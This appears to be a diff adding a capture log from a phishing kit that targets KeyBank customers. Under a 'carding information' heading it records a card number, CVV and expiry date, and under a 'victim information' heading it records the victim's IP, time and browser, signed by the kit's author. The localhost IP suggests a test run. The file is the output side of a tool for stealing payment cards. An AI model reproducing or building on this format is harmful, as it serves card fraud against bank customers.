@@ -1,0 +1,20 @@
+
+
+
+[ KEYBANK CARDING INFORMATION ]
+
+[Card Name] =card name
+[Card Number] = 6709 6709 6786 9734
+[Cvv]	= 874
+[Expiration Date] = 12/25
+
+
+
+[VICTIM INFORMATION ]
+[Time / Date] = 22:22:00 13/06/2022
+[IP INFO] = http://ip-api.com/json/::1
+[REMOTE IP] = ::1
+[BROWSER] = Chrome On Windows 10
+[BROWSER] = Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36
+
+[ BY @X_hammer ]
